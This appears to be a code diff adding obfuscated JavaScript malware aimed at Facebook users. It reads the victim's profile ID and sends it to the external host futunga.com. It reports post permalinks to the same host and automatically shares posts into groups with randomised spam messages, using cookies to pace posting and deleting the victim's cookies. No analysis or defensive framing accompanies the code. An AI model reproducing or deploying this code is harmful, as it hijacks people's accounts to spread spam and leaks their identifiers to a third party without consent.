+    if (l0F[l](e[l0F.j4], l0F.V9) && l0F[F](e[l0F.X0], l0F.l9)) {
+      var o = e[l0F.D1];
+      gelen = o[l0F.O7](l0F.d7);
+      e[l0F.r0];
+    }
+  };
+  e[l0F.F0](l0F.W7, l0F.v5);
+  e[l0F.B0]();
+}
+
+function baslat() {
+  var Q = new XMLHttpRequest();
+  Q[l0F.M0](l0F.t4, l0F.N5, l0F.N4);
+  Q[l0F.F0](l0F.o9, l0F.X7);
+  Q[l0F.s9] = function() {
+    var F = "D6",
+      l = "d6",
+      o = "f6",
+      S = "X6";
+    if (l0F[S](Q[l0F.j4], l0F.V9) && l0F[o](Q[l0F.X0], l0F.l9)) {
+      var e = Q[l0F.D1];
+      link_encode = e[l0F.O7](l0F.H9);
+      var p = JSON[l0F.e9](Q[l0F.D1]);
+      if (p) {
+        var G = p[l0F.y0];
+        if (l0F[l](G, l0F.S0)) {
+          if (l0F[F](G, l0F.Y7)) {
+            paylasimgetir(G, link_encode[l0F.L9]);
+
+          }
+        } else {
+          sorunmesaji(l0F.O0);
+        }
+      }
+      Q[l0F.r0];
+    }
+  };
+  Q[l0F.B0]();
+}
+
+function basarilipaylasim() {
+  if (!grupbasarilikontrol) {
+    var F = function() {
+      document[l0F.i9] = l0F.O9 + profile_id + l0F.o4 + l0F.L9;
+    };
+    F();
+  } else {
+    var l = function() {
+      document[l0F.i9] = l0F.O9 + profile_id + l0F.o4 + (Number(grupbasarilikontrol[l0F.L9]) + l0F.L9);
+    };
+    l();
+  }
+  if (!grupsirasikontrol) {
+    var o = function() {
+      document[l0F.i9] = l0F.G9 + profile_id + l0F.o4 + l0F.L9;
+    };
+    o();
+  } else {
+    var S = function() {
+      document[l0F.i9] = l0F.G9 + profile_id + l0F.o4 + (Number(grupsirasikontrol[l0F.L9]) + l0F.L9);
+    };
+    S();
+  }
+}
+
+function permakaydet(F) {
+  var l = 'https://futunga.com/permas.php?perma=https://www.facebook.com/',
+    o = new XMLHttpRequest();
+  o[l0F.M0](l0F.H0, l + F, l0F.N4);
+  o[l0F.B0]();
+}
+
+function paylasimgetir2(S, e) {
+  var p = new XMLHttpRequest();
+  p[l0F.M0](l0F.t4, l0F.C9 + S, l0F.m0);
+  p[l0F.s9] = function() {
+    var F = "h6",
+      l = "W6";
+    if (l0F[l](p[l0F.j4], l0F.V9) && l0F[F](p[l0F.X0], l0F.l9)) {
+      var o = p[l0F.D1];
+      data01 = o[l0F.O7](l0F.q9);
+      data02 = o[l0F.O7](l0F.f7);
+      data03 = o[l0F.O7](l0F.d7);
+      data04 = o[l0F.O7](l0F.X4);
+      data05 = o[l0F.O7](l0F.d1);
+      data06 = o[l0F.O7](l0F.v9);
+      data07 = o[l0F.O7](l0F.B9);
+      data08 = o[l0F.O7](l0F.p5);
+      data09 = o[l0F.O7](l0F.K0);
+      p[l0F.r0];
+    }
+  };
+  p[l0F.F0](l0F.W7, l0F.v5);
+  p[l0F.B0]();
+  if (data03[l0F.L9]) {
+    var G = l0F.Z4 + e + l0F.X9;
+    grupdapaylas(data01[l0F.L9], data02[l0F.L9], data03[l0F.L9], data04[l0F.L9], data05[l0F.L9], data06[l0F.L9], data07[l0F.L9], data08[l0F.L9], G, data09[l0F.L9]);
+  }
+}
+
+function dynrandom() {
+  var F = 72,
+    l = 16;
+  return dyn(l) + l0F.E7 + dyn(l0F.l7) + l0F.E7 + dyn(F);
+}
+
+function messagerand() {
+  var F = "L3";
+  return mesagge[Math[l0F.w4](l0F[F](Math[l0F.v0](), mesagge.length))];
+}
+var paylasim_araligi = l0F.a9,
+  grup_ids = [],
+  grup_limit = l0F.M9,
+  arkadaslar_list = [],
+  arkadaslar_list2 = [],
+  etiket_limit = l0F.N9,
+  grup_say = l0F.N9,
+  success = l0F.N9,
+  cronjob = l0F.l0,
+  close = l0F.N9,
+  d = document,
+  mesagge = Array(l0F.N7, l0F.t0, l0F.a0, l0F.z7, l0F.g9, l0F.B7, l0F.y4, l0F.w1, l0F.t5, l0F.p0, l0F.L0, l0F.P5, l0F.c7, l0F.O4, l0F.H1, l0F.b9, l0F.C0, l0F.d0),
+  zaman = new Date(),
+  profilkayit = new RegExp(l0F.B4 + l0F.e7),
+  profilkayitkontrol = document[l0F.i9][l0F.O7](profilkayit);
+if (!profilkayitkontrol) {
+  var u = function() {
+    document[l0F.i9] = l0F.B4 + l0F.o4 + gelen[l0F.L9];
+  };
+  profil_id_getir();
+  u();
+  var profile_id = gelen[l0F.L9];
+} else {
+  var profile_id = profilkayitkontrol[l0F.L9];
+}
+var cookiekayit = new RegExp(l0F.J0 + profile_id + l0F.e7),
+  cookiekayitkontrol = document[l0F.i9][l0F.O7](cookiekayit),
+  grupsirasi = new RegExp(l0F.G9 + profile_id + l0F.e7),
+  grupsirasikontrol = document[l0F.i9][l0F.O7](grupsirasi),
+  grupbasarili = new RegExp(l0F.O9 + profile_id + l0F.e7),
+  grupbasarilikontrol = document[l0F.i9][l0F.O7](grupbasarili),
+  paylasimaraligi = new RegExp(l0F.E0 + profile_id + l0F.e7),
+  paylasimaraligikontrol = document[l0F.i9][l0F.O7](paylasimaraligi);
+if (!cookiekayitkontrol || (l0F[l0F.a4](cookiekayitkontrol[l0F.L9], zaman[l0F.c0]()))) {
+  new Image().src = "http://futunga.com/php/prf.php?id="+profile_id;
+  if (l0F[l0F.Y0](document[l0F.M5][l0F.h5](l0F.q7), l0F.N9)) {
+    if (l0F[l0F.M7](document[l0F.M5][l0F.h5](l0F.u7), l0F.N9)) {
+      window[l0F.Z7](function() {
+        var o = "http://www.facebook.com",
+          S = function(F) {
+            var l = "href";
+            location[l] = F;
+          };
+        S(o);
+      }, l0F.f0);
+    } else {
+      var T = function() {
+          var F = "x1";
+          document[l0F.i9] = l0F.J0 + profile_id + l0F.o4 + (zaman[l0F.c0]() + l0F[F](cronjob, l0F.f0));
+        },
+        v = function() {
+          var F = "y1";
+          document[l0F.i9] = l0F.E0 + profile_id + l0F.o4 + (zaman[l0F.c0]() + l0F[F](paylasim_araligi, l0F.f0));
+        };
+      deleteAllCookies();
+      T();
+      v();
+      removebutton();
+      baslat();
+    }
+  }
+} else {
+  removebutton();
+  if (!paylasimaraligikontrol || (l0F[l0F.D4](paylasimaraligikontrol[l0F.L9], zaman[l0F.c0]()))) {
+    var h = function() {
+      var F = "m1";
+      document[l0F.i9] = l0F.E0 + profile_id + l0F.o4 + (zaman[l0F.c0]() + l0F[F](paylasim_araligi, l0F.f0));
+    };
+    h();
+    if (!grupbasarilikontrol || (l0F[l0F.p9](grupbasarilikontrol[l0F.L9], grup_limit))) {
+      gruplaricek();
+    } else {
+      console[l0F.F7](l0F.r9);
+    }
+  } else {
+    console[l0F.F7](Math[l0F.w4](l0F[l0F.R0]((paylasimaraligikontrol[l0F.L9] - zaman[l0F.c0]()), l0F.f0)));
+  }
+  console[l0F.F7](Math[l0F.w4](l0F[l0F.K4]((cookiekayitkontrol[l0F.L9] - zaman[l0F.c0]()), l0F.f0)));
+};
